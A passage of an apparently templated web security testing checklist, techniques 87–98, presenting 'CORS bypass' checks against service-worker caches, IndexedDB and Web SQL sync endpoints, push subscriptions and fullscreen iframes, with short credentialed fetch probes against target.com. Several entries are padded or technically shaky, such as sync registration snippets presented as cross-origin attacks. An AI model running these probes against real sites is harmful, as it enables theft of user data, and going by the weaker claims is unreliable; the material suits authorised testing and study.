TECHNIQUE 87: Cache CORS Bypass for Cache API Access
Steps:

The Cache API (used by service workers) stores request/response pairs.
Cache API is same-origin restricted; cross-origin service workers cannot access another origin's cache.
However, check if cached content is served via a misconfigured CORS endpoint.
Test if cached responses (served from service worker) include sensitive data that is accessible cross-origin:

javascript   // Cache may serve CORS-misconfigured responses
   fetch('https://target.com/cached-api-response', {credentials: 'include', mode: 'cors'})

Also check if the cache stores responses with overly permissive CORS headers that then make cache content available cross-origin.

When it is vulnerable:
When cached responses include permissive CORS headers not present in the live responses, or when cache poisoning enables inserting cross-origin accessible content into the cache.
Severity: MEDIUM — Cached sensitive data accessible cross-origin; cache poisoning via CORS misconfiguration.

TECHNIQUE 88: IndexedDB CORS Bypass for Database Access
Steps:

IndexedDB is strictly same-origin — no cross-origin access is possible by design.
However, check if the application exposes IndexedDB data via a server API that has CORS misconfiguration.
Test if the IndexedDB synchronization endpoint (which pushes local DB changes to the server) is accessible cross-origin.
Also check if the IndexedDB data is exported/imported via an API with CORS issues.
If the server-side representation of IndexedDB data is accessible cross-origin, an attacker can steal offline app data.

When it is vulnerable:
When server-side APIs that sync, export, or query IndexedDB data have permissive CORS headers, exposing what is essentially client-side database content.
Severity: MEDIUM — Offline app data exposure; depends on what sensitive data is stored in the IndexedDB.

TECHNIQUE 89: Web SQL CORS Bypass for Legacy Database
Steps:

Web SQL is deprecated but still supported in some browsers (Chrome/Safari historically).
Like IndexedDB, Web SQL is same-origin — no direct cross-origin access.
Check if the application has Web SQL sync endpoints with CORS misconfiguration.
Test any legacy data sync endpoints that might have been created for Web SQL data:

javascript   fetch('https://target.com/api/websql-sync', {credentials: 'include'})

This is primarily relevant for older mobile web apps that used Web SQL for offline storage.

When it is vulnerable:
When Web SQL synchronization endpoints expose stored data cross-origin. Given Web SQL is deprecated, this is primarily a legacy concern but worth checking in older applications.
Severity: LOW to MEDIUM — Legacy concern; applications still using Web SQL are older and may have other security issues.

TECHNIQUE 90: Application Cache CORS Bypass for AppCache
Steps:

AppCache (Application Cache) is fully deprecated and removed from modern browsers.
If the application uses AppCache (via <html manifest="cache.manifest">), the manifest file must be served from the same origin.
Test if any legacy AppCache manifests have CORS headers that allow cross-origin reading.
If an attacker can modify what is cached (by controlling the manifest URL via CORS), they can substitute legitimate cached resources with malicious ones.
This is purely a legacy concern for very old applications.

When it is vulnerable:
When AppCache manifest files are accessible and modifiable cross-origin, allowing an attacker to control what resources are cached. This is extremely rare in modern applications.
Severity: LOW — Deprecated technology; legacy applications with unique risk.

TECHNIQUE 91: Storage Manager CORS Bypass for Storage Estimation
Steps:

The navigator.storage.estimate() API reports storage usage. Same-origin only.
Check if the application exposes storage usage statistics via a server-side API.
Test if storage quota/usage information is available cross-origin:

javascript   fetch('https://target.com/api/user/storage-usage', {credentials: 'include'})

Storage usage can reveal user activity levels (e.g., how much data a user has generated).
Precise storage numbers can be used as side-channel information.

When it is vulnerable:
When storage usage information is exposed via a CORS-misconfigured API, leaking user activity and data volume metrics.
Severity: LOW — Information leakage; minimal direct security impact but reveals user behavior.

TECHNIQUE 92: Content Index CORS Bypass for PWA Content
Steps:

The Content Index API allows PWAs to register offline-accessible content.
This API is same-origin restricted.
Check if the content index registration endpoint (server-side) has CORS misconfiguration.
An attacker who can read the content index could learn what content the user has saved offline.
Test:

javascript   fetch('https://target.com/api/content-index', {credentials: 'include'})
   .then(r => r.json())
   .then(index => /* read what articles/content user has saved offline */);
When it is vulnerable:
When the content index API (server-side) is accessible cross-origin, revealing what content the user has saved for offline reading (reading habits, interests).
Severity: LOW — Information disclosure about user reading habits; minimal direct exploitation.

TECHNIQUE 93: Background Fetch CORS Bypass for Background Sync
Steps:

Background Fetch allows downloading large files even when the user leaves the page.
Service worker handles background fetch — same-origin restriction applies.
Check if background fetch initiation endpoints have CORS misconfiguration.
If an attacker page can initiate a background fetch of a large file that the user's storage is charged for, it is a resource exhaustion attack.
Test:

javascript   registration.backgroundFetch.fetch('my-fetch', ['https://target.com/large-private-file.zip'], {
     title: 'Downloading Important Update'
   });
When it is vulnerable:
When background fetch can be initiated cross-origin, causing the victim's browser to download and store data from the target domain. Also relevant if the fetch triggers server-side charges.
Severity: LOW to MEDIUM — Resource exhaustion and potentially downloading copyrighted or sensitive material to victim's device.

TECHNIQUE 94: Periodic Background Sync CORS Bypass
Steps:

Periodic Background Sync allows service workers to sync data at regular intervals even when the app is not open.
Registration requires a user-installed PWA.
Test if the periodic sync endpoints on the server have CORS misconfiguration.
If an attacker can make a victim's browser periodically send requests to their server, they can monitor the user's presence (timing attacks).
Check if sync registration can be triggered cross-origin:

javascript   registration.periodicSync.register('content-sync', {minInterval: 24 * 60 * 60 * 1000});
When it is vulnerable:
When periodic background sync can be registered cross-origin, causing the victim's browser to make periodic requests to attacker-controlled URLs. This creates a long-term monitoring capability.
Severity: MEDIUM — Long-term user tracking and presence monitoring through background sync.

TECHNIQUE 95: Background Sync CORS Bypass for Offline Sync
Steps:

Background Sync triggers data synchronization when the user comes back online.
It is handled by the service worker (same-origin restricted).
Test if background sync tags can be registered from a cross-origin context.
Also check if the server-side sync endpoint has CORS misconfiguration:

javascript   fetch('https://target.com/api/sync', {
     method: 'POST',
     credentials: 'include',
     body: JSON.stringify({syncData: 'attacker controlled data'})
   });

If the sync endpoint accepts cross-origin data, an attacker can inject data into the sync process.

When it is vulnerable:
When background sync server endpoints accept cross-origin data injection, allowing attackers to insert malicious sync data into the user's application state.
Severity: MEDIUM — Data injection via sync bypass; application state manipulation.

TECHNIQUE 96: Push API CORS Bypass for Push Subscriptions
Steps:

Web Push subscriptions require a service worker (same-origin) and VAPID keys.
Check if push subscription management endpoints have CORS misconfiguration.
If an attacker can read the victim's push subscription (endpoint URL + auth keys) cross-origin, they can send unauthorized push notifications.
Test:

javascript   fetch('https://target.com/api/push-subscription', {credentials: 'include'})
   .then(r => r.json())
   .then(sub => {
     // Now attacker has the subscription endpoint and keys
     // Can send push notifications to this user
   });

Also test if push notification payloads are decryptable by the attacker (if the server stores the notification data endpoint cross-origin).

When it is vulnerable:
When push subscription details (endpoint URL and encryption keys) are accessible cross-origin, enabling the attacker to send arbitrary push notifications to the victim.
Severity: HIGH — Attacker sends push notifications masquerading as the legitimate service; phishing and malware delivery.

TECHNIQUE 97: Screen Orientation CORS Bypass for Orientation Lock
Steps:

The Screen Orientation API controls device screen rotation.
Locking orientation is a same-origin operation.
Test if orientation lock state is exposed via a server-side API with CORS misconfiguration.
Also test if cross-origin iframes can lock the parent page's screen orientation.
Screen orientation information can reveal what type of device the user has (phone vs tablet) and how they are holding it.

When it is vulnerable:
When cross-origin content can lock or manipulate the device's screen orientation without user consent, degrading user experience. Also when orientation state is exposed as private user information via CORS-misconfigured APIs.
Severity: LOW — Primarily usability/UX impact; minimal direct security exploitation value.

TECHNIQUE 98: Fullscreen API CORS Bypass for Fullscreen
Steps:

The Fullscreen API allows elements to enter fullscreen mode.
Cross-origin iframes require the allowfullscreen attribute to enter fullscreen.
Test if the fullscreen API can be abused cross-origin:

html   <iframe src="https://target.com/embed" allowfullscreen></iframe>
   <script>
   // Try to make the iframe go fullscreen programmatically
   iframe.requestFullscreen().then(() => {
     // iframe is now fullscreen — can create convincing fake UI
   });

If a cross-origin iframe goes fullscreen, it can display a convincing fake UI (phishing) covering the entire screen.
The user sees a full-screen version of the attacker-controlled content, possibly with a fake login dialog.

When it is vulnerable:
When a cross-origin iframe with allowfullscreen can be triggered to enter fullscreen mode programmatically from the parent attacker page, enabling a convincing full-screen phishing UI.
Severity: MEDIUM — UI redressing/phishing via fullscreen; can convince users to enter credentials into a fake dialog.